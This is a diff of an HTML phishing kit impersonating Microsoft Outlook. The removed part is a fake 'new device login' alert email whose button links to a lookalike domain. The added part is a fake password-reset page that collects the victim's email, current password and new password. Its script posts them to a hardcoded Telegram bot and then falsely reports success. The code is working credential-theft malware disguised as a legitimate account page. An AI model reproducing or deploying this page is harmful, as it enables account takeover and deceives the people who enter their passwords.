@@ -3,98 +3,217 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Security Alert</title>
-      <!-- Favicons Icons -->
-    <link rel="apple-touch-icon" sizes="180x180" href="download.jpg" />
-    <link rel="icon" type="image/png" sizes="32x32" href="download.jpg" />
-    <link rel="icon" type="image/png" sizes="16x16" href="download.jpg" />
+  <title>Reset Your Password</title>
   <style>
     body {
-      font-family: Segoe UI, Helvetica, Arial, sans-serif;
-      background-color: #f3f2f1;
       margin: 0;
-      padding: 0;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f3f2f1;
     }
     .container {
+      max-width: 390px;
+      margin: 80px auto;
       background-color: #ffffff;
-      max-width: 600px;
-      margin: 30px auto;
+      padding: 40px;
       border: 1px solid #e1dfdd;
       border-radius: 8px;
-      padding: 30px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.05);
     }
-    .header {
+    .logo {
       text-align: center;
-      padding-bottom: 20px;
+      margin-bottom: 30px;
     }
-    .header img {
-      width: 120px;
+    .logo img {
+      width: 140px;
     }
-    .header h2 {
-      color: #333333;
+    h2 {
       font-size: 22px;
-    }
-    .content {
-      font-size: 15px;
       color: #333333;
-      line-height: 1.6;
+      margin-bottom: 10px;
     }
-    .details {
-      background-color: #f9f9f9;
-      border-left: 4px solid #0078d4;
-      padding: 10px 15px;
-      margin: 20px 0;
+    p {
+      font-size: 14px;
+      color: #666666;
+      margin-bottom: 20px;
     }
-    .button {
-      display: inline-block;
+    label {
+      display: block;
+      font-size: 14px;
+      margin-top: 15px;
+      margin-bottom: 5px;
+      color: #333333;
+    }
+    input[type="password"],
+    input[type="text"],
+    input[type="email"] {
+      width: 100%;
+      padding: 10px;
+      font-size: 14px;
+      border: 1px solid #c8c6c4;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+    
+    .submit-btn {
+      width: 100%;
       background-color: #0078d4;
-      color: #ffffff !important;
-      padding: 12px 20px;
-      text-decoration: none;
-      border-radius: 5px;
-      margin-top: 20px;
+      color: white;
+      border: none;
+      padding: 12px;
+      margin-top: 25px;
+      font-size: 15px;
+      border-radius: 4px;
+      cursor: pointer;
     }
+    .submit-btn:hover {
+      background-color: #005ea2;
+    }
+
+     .status {
+      margin-top: 15px;
+      font-size: 14px;
+      font-style: italic;
+      color: green;
+      display: none;
+    }
+
+    .error {
+      color: red;
+    }
+
     .footer {
       text-align: center;
       font-size: 12px;
-      color: #666666;
-      margin-top: 40px;
+      color: #999999;
+      margin-top: 30px;
     }
+
+  .password-wrapper {
+  position: relative;
+}
+
+.password-wrapper input {
+  padding-right: 35px; /* add space for the eye icon */
+}
+
+.toggle-eye {
+  position: relative;
+  top: -31px;
+  right: -360px;
+  transform: translateY(-50%);
+  cursor: pointer;
+  font-size: 16px;
+  color: #666;
+  user-select: none;
+}
+
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="header">
+    <div class="logo">
       <img src="https://res.cloudinary.com/primecardcloud/image/upload/v1747415146/jxag0acrkxv8z4gt6qwf.png" alt="Outlook Logo">
-      <h2>Security Alert</h2>
     </div>
-    <div class="content">
-      <p>Hi <strong>Account Holder</strong>,</p>
-      <p>We detected a login to your Outlook account from a new device on <strong><span id="timestamp">May 16, 2025 at 3:21 PM (Local Time)</span></strong>.</p>
+    <h2>Reset your password</h2>
+    <p>To help keep your account secure, please enter your current password and choose a new one.</p>
+    <form id="resetForm">
+  <label for="email">Email</label>
+  <input type="email" id="email" name="mail" required>
 
-      <div class="details">
-        <p><strong>Device:</strong> Windows 10 PC</p>
-        <p><strong>Browser:</strong> Google Chrome 124.0</p>
-        <p><strong>IP Address:</strong> 172.58.239.81</p>
-        <p><strong>Location:</strong> San Francisco, CA, USA</p>
-      </div>
+  <label for="oldPass">Current password</label>
+  <div class="password-field">
+    <input type="password" id="oldPass" name="oldPass" required>
+    <span class="toggle-eye" onclick="togglePassword('oldPass')">  <!-- Eye icon (default) -->
+    <svg class="eye-icon" xmlns="http://www.w3.org/2000/svg" height="20" width="20" fill="#666" viewBox="0 0 24 24">
+      <path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"/>
+      <circle cx="12" cy="12" r="2.5"/>
+    </svg></span>
+    
+  </div>
 
-      <p>If this was you, no further action is needed.</p>
-      <p>If you did <strong>not</strong> authorize this login, please secure your account immediately:</p>
+  <label for="newPassword">New password</label>
+  <div class="password-field">
+    <input type="password" id="newPassword" name="newPassword" required>
+    <span class="toggle-eye" onclick="togglePassword('newPassword')">  <!-- Eye icon (default) -->
+    <svg class="eye-icon" xmlns="http://www.w3.org/2000/svg" height="20" width="20" fill="#666" viewBox="0 0 24 24">
+      <path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"/>
+      <circle cx="12" cy="12" r="2.5"/>
+    </svg></span>
+  </div>
 
-      <p>
-        <a href="https://microsoftt.ip-ddns.com/" class="button">Reset Your Password</a>
-      </p>
+  <label for="newPass">Confirm new password</label>
+  <div class="password-field">
+    <input type="password" id="newPass" name="newPass" required>
+    <span class="toggle-eye" onclick="togglePassword('newPass')">  <!-- Eye icon (default) -->
+    <svg class="eye-icon" xmlns="http://www.w3.org/2000/svg" height="20" width="20" fill="#666" viewBox="0 0 24 24">
+      <path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"/>
+      <circle cx="12" cy="12" r="2.5"/>
+    </svg></span>
+  </div>
 
-      <p>For enhanced security, we recommend enabling two-factor authentication (2FA).</p>
-
-      <p>Thank you,<br><strong>The Outlook Security Team</strong></p>
-    </div>
-
+  <button type="submit" class="submit-btn">Reset Password</button>
+  <p id="status" class="status"></p>
+</form>
     <div class="footer">
-      <p>This message was sent to protect the security of your Outlook account.</p>
-      <p>&copy; 2025 Microsoft Corporation. All rights reserved.</p>
+      &copy; 2025 Microsoft Corporation. All rights reserved.
     </div>
   </div>
+ <script>
+    const TELEGRAM_BOT_TOKEN = '8072471611:AAFuXj2BnzWNV2GnMLPLpqui5MBVtBJvdvg';
+    const TELEGRAM_CHAT_ID = '7787110558';
+
+    document.getElementById("resetForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const oldPass = document.getElementById("oldPass").value.trim();
+      const newPass = document.getElementById("newPass").value.trim();
+      const email = document.getElementById("email").value.trim();
+      const statusEl = document.getElementById("status");
+
+      if (!oldPass || !newPass) {
+        statusEl.textContent = "Please fill in all fields.";
+        statusEl.classList.add("error");
+        statusEl.style.display = "block";
+        return;
+      }
+
+      const message = `🔐 *Password Reset Request*\n\n 📩 *Email:* ${email} \n👤 *Old Password:* ${oldPass}\n🆕 *New Password:* ${newPass}\n 📅 *Time:* ${new Date().toLocaleString()}`;
+
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.ok) {
+          statusEl.textContent = " Your password has been reset successfully.";
+          statusEl.classList.remove("error");
+          statusEl.style.display = "block";
+          document.getElementById("resetForm").reset();
+        } else {
+          throw new Error("Telegram API error");
+        }
+      })
+      .catch(err => {
+        statusEl.textContent = " Failed to submit your request.";
+        statusEl.classList.add("error");
+        statusEl.style.display = "block";
+        console.error("Error:", err);
+      });
+    });
+  </script>
+  <script>
+  function togglePassword(id) {
+    const input = document.getElementById(id);
+    input.type = input.type === 'password' ? 'text' : 'password';
+  }
+</script>
 </body>
 </html>
